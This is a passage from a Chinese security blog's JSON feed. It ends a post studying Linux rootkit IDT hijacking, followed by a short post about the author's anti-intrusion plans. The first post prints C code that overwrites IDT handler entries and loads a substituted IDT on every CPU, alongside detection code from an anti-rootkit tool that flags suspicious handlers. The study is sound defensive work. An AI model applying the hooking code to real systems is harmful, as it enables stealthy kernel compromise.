class=\"n\">set_addr_rw</span><span class=\"p\">(</span><span class=\"n\">old_idt_table</span><span class=\"p\">);</span>    <span class=\"n\">cur_idt_table</span><span class=\"p\">[</span><span class=\"n\">n</span><span class=\"p\">].</span><span class=\"n\">offset_high</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"n\">addr</span> <span class=\"o\">&gt;&gt;</span> <span class=\"mi\">32</span><span class=\"p\">)</span> <span class=\"o\">&amp;</span> <span class=\"mh\">0xffffffff</span><span class=\"p\">;</span>    <span class=\"n\">cur_idt_table</span><span class=\"p\">[</span><span class=\"n\">n</span><span class=\"p\">].</span><span class=\"n\">offset_middle</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"n\">addr</span> <span class=\"o\">&gt;&gt;</span> <span class=\"mi\">16</span><span class=\"p\">)</span> <span class=\"o\">&amp;</span> <span class=\"mh\">0xffff</span><span class=\"p\">;</span>    <span class=\"n\">cur_idt_table</span><span class=\"p\">[</span><span class=\"n\">n</span><span class=\"p\">].</span><span class=\"n\">offset_low</span> <span class=\"o\">=</span> <span class=\"n\">addr</span> <span class=\"o\">&amp;</span> <span class=\"mh\">0xffff</span><span class=\"p\">;</span>    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">cur_idt_table</span> <span class=\"o\">==</span> <span class=\"n\">old_idt_table</span><span class=\"p\">)</span>        <span class=\"n\">set_addr_ro</span><span class=\"p\">(</span><span class=\"n\">old_idt_table</span><span class=\"p\">);</span><span class=\"p\">}</span><span class=\"kt\">void</span> <span class=\"nf\">idt_substitute</span><span class=\"p\">(</span><span class=\"kt\">void</span><span class=\"p\">)</span><span class=\"p\">{</span>    <span class=\"k\">struct</span> <span class=\"n\">desc_ptr</span> <span class=\"n\">idtr</span><span class=\"p\">;</span>    <span class=\"n\">memcpy</span><span class=\"p\">(</span><span class=\"n\">new_idt_table</span><span class=\"p\">,</span> <span class=\"n\">cur_idt_table</span><span class=\"p\">,</span> <span class=\"n\">IDT_SZ</span><span class=\"p\">);</span>    <span class=\"n\">idtr</span><span class=\"p\">.</span><span class=\"n\">address</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"kt\">unsigned</span> <span class=\"kt\">long</span><span class=\"p\">)</span><span class=\"n\">new_idt_table</span><span class=\"p\">;</span>    <span class=\"n\">idtr</span><span class=\"p\">.</span><span class=\"n\">size</span> <span class=\"o\">=</span> <span class=\"n\">idt_size</span><span class=\"p\">;</span>    <span class=\"n\">on_each_cpu</span><span class=\"p\">(</span><span class=\"n\">local_load_idt</span><span class=\"p\">,</span> <span class=\"o\">&amp;</span><span class=\"n\">idtr</span><span class=\"p\">,</span> <span class=\"mi\">1</span><span class=\"p\">);</span>    <span class=\"n\">cur_idt_table</span> <span class=\"o\">=</span> <span class=\"n\">new_idt_table</span><span class=\"p\">;</span><span class=\"p\">}</span></code></pre></div></div><p>替换表的形式来完成劫持，其中对 IDTR 寄存器的操作使用 LIDT 指令和 SIDT 指令。另外 <code class=\"language-plaintext highlighter-rouge\">sys_call_table</code> 的 hook 应该方法也是类似，先在 IDT 表中找到 0x80 中断的位置，再根据特定 function 再 <code class=\"language-plaintext highlighter-rouge\">sys_call_table</code> 中的偏移…</p><p>顺便贴一张 IDTR</p><p><img src=\"https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg.it610.com%2Fimage%2Finfo9%2F3a4a1cf12b0940c3a8115008a28511bd.jpg&amp;refer=http%3A%2F%2Fimg.it610.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=auto?sec=1650278847&amp;t=cec7d575642e0f888777f63f0507bee7\" alt=\"百度\" /></p><p>在字节的 <code class=\"language-plaintext highlighter-rouge\">anti_rootkit</code> 中我们截取 <code class=\"language-plaintext highlighter-rouge\">interrupt</code> 检查部分，事实上 <code class=\"language-plaintext highlighter-rouge\">sys_call_table</code> 的检查部分也是一样的</p><div class=\"language-c highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">analyze_interrupts</span><span class=\"p\">(</span><span class=\"kt\">void</span><span class=\"p\">)</span><span class=\"p\">{</span><span class=\"cp\">#ifdef CONFIG_X86</span>    <span class=\"kt\">int</span> <span class=\"n\">i</span><span class=\"p\">;</span>    <span class=\"kt\">unsigned</span> <span class=\"kt\">long</span> <span class=\"n\">addr</span><span class=\"p\">;</span>    <span class=\"k\">struct</span> <span class=\"n\">module</span> <span class=\"o\">*</span><span class=\"n\">mod</span><span class=\"p\">;</span>    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"o\">!</span><span class=\"n\">idt</span> <span class=\"o\">||</span> <span class=\"o\">!</span><span class=\"n\">ckt</span><span class=\"p\">)</span>        <span class=\"k\">return</span><span class=\"p\">;</span>    <span class=\"c1\">// 遍历所有 entries</span>    <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">IDT_ENTRIES</span><span class=\"p\">;</span> <span class=\"n\">i</span><span class=\"o\">++</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">const</span> <span class=\"kt\">char</span> <span class=\"o\">*</span><span class=\"n\">mod_name</span> <span class=\"o\">=</span> <span class=\"s\">\"-1\"</span><span class=\"p\">;</span>         <span class=\"n\">addr</span> <span class=\"o\">=</span> <span class=\"n\">idt</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">];</span>        <span class=\"c1\">// ckt 判断是否为内核代码段</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"o\">!</span><span class=\"n\">ckt</span><span class=\"p\">(</span><span class=\"n\">addr</span><span class=\"p\">))</span> <span class=\"p\">{</span>            <span class=\"n\">module_list_lock</span><span class=\"p\">();</span>            <span class=\"c1\">// 获取 idt 对应函数的地址</span>            <span class=\"n\">mod</span> <span class=\"o\">=</span> <span class=\"n\">get_module_from_addr</span><span class=\"p\">(</span><span class=\"n\">addr</span><span class=\"p\">);</span>            <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">mod</span><span class=\"p\">)</span> <span class=\"p\">{</span>                <span class=\"n\">mod_name</span> <span class=\"o\">=</span> <span class=\"n\">mod</span><span class=\"o\">-&gt;</span><span class=\"n\">name</span><span class=\"p\">;</span>            <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>                <span class=\"c1\">// 寻找是否为隐藏的内核模块</span>                <span class=\"c1\">// 通过遍历 ksets 下的 mod list，通过于 kobj 一一比对</span>                <span class=\"c1\">// 如果找不到，则为隐藏的内核模块，是可疑的</span>                <span class=\"k\">const</span> <span class=\"kt\">char</span> <span class=\"o\">*</span><span class=\"n\">name</span> <span class=\"o\">=</span> <span class=\"n\">find_hidden_module</span><span class=\"p\">(</span><span class=\"n\">addr</span><span class=\"p\">);</span>                <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">IS_ERR_OR_NULL</span><span class=\"p\">(</span><span class=\"n\">name</span><span class=\"p\">))</span> <span class=\"p\">{</span>                    <span class=\"n\">module_list_unlock</span><span class=\"p\">();</span>                    <span class=\"k\">continue</span><span class=\"p\">;</span>                <span class=\"p\">}</span>                <span class=\"n\">mod_name</span> <span class=\"o\">=</span> <span class=\"n\">name</span><span class=\"p\">;</span>            <span class=\"p\">}</span>            <span class=\"n\">interrupts_print</span><span class=\"p\">(</span><span class=\"n\">mod_name</span><span class=\"p\">,</span> <span class=\"n\">i</span><span class=\"p\">);</span>            <span class=\"n\">module_list_unlock</span><span class=\"p\">();</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span><span class=\"cp\">#endif</span><span class=\"p\">}</span></code></pre></div></div><p>这种检测，对函数的 entry 做了足够的检测，但是如何检测 hook 在函数中间的情况呢?</p><h2 id=\"最后\">最后</h2><p>其实看的还是比较浅显的，如果每个模块都单独细钻，会耗费较大的时间，后续会慢慢跟进</p><h2 id=\"参考\">参考</h2><blockquote>  <p>有字节群中沈平推荐的两本，可以细细品读，我还没看…</p></blockquote><p>1, The Rootkit Arsenal Escape and Evasion in the Dark Corners of the System by Bill Blunden， 2nd edition，第一版是中译本</p><p>2, Rootkits and Bootkits Reversing Modern Malware and Next Generation Threats by Alex Matrosov, Eugene Rodionov, Sergey Bratus，有中译本</p><p>3, <a href=\"https://nskernel.gitbook.io/kernel-play-guide/hacking-interrupts-exceptions-and-trap-handlers/hooking-an-idt-handler\">nskernel-kernel-play-guide</a></p>",
            "url": "https://chriskalix.github.io/2022/03/19/linux-rootkit%E5%88%9D%E7%AA%A5-%E4%B8%80-idt",
            
            
            
            
            
            "date_published": "2022-03-19T00:00:00+01:00",
            "date_modified": "2022-03-19T00:00:00+01:00",
            
                "author":  {
                "name": "chriskali",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://chriskalix.github.io/2022/03/18/%E4%BB%8E%E5%A4%B4%E5%BC%80%E5%A7%8B%E7%9A%84%E5%8D%9A%E5%AE%A2",
            "title": "从头开始的博客",
            "summary": "Gridea 用的不习惯",
            "content_text": "规划后续长期做的方向，应该还是 HIDS/WAF 反入侵相关。当然也会涉及 Java/Golang 的一些安全开发，这里将记录我的一切~",
            "content_html": "<h2 id=\"规划\">规划</h2><p>后续长期做的方向，应该还是 HIDS/WAF 反入侵相关。当然也会涉及 Java/Golang 的一些安全开发，这里将记录我的一切~</p>",
            "url": "https://chriskalix.github.io/2022/03/18/%E4%BB%8E%E5%A4%B4%E5%BC%80%E5%A7%8B%E7%9A%84%E5%8D%9A%E5%AE%A2",
            
            
            
            
            
            "date_published": "2022-03-18T00:00:00+01:00",
            "date_modified": "2022-03-18T00:00:00+01:00",
            
                "author":  {
                "name": "chriskali",
                "url": null,
                "avatar": null
                }
                
            
        }
    
    ]
}